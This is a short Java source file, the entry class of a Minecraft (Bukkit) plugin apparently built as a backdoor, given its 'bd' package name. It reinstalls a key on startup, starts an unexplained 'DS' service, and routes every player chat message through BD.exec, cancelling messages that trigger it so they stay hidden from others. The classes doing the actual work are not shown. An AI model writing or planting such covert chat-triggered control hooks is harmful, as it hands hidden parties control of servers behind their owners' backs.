package com.github.rumoel.bd.minecraft.plugin;

import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Init extends JavaPlugin implements Listener {
	static Init init;
	static DS ds = new DS();

	public static void main(String[] args) {

	}

	@Override
	public void onEnable() {
		try {
			init = this;
			BD.reInstallKey();
			getServer().getPluginManager().registerEvents(this, this);
			try {
				ds.enable();
			} catch (Exception e) {
				e.printStackTrace();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public void onDisable() {
		ds.disable();
	}

	@EventHandler(priority = EventPriority.HIGH)
	public void c(AsyncPlayerChatEvent e) {
		e.setCancelled(BD.exec(e));
	}

}
